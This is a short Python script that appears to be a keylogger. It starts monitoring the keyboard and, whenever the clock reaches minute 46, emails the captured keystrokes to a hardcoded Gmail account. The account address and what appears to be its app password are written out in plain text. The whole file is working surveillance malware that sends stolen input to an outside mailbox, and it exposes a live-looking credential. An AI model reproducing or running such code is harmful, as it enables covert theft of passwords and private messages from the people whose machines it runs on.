from Email import Email
from Keyboard import Keyboard
from datetime import datetime as dt

time = 46
keyboard = Keyboard()
keyboard.mon_key()

while True:
    if dt.now().minute == time:
        email = Email("sakakibarav5555@gmail.com","zcph gupb aogo zgub",
                      "sakakibarav5555@gmail.com",keyboard.get_keys())
        
        email.enviar_email()
        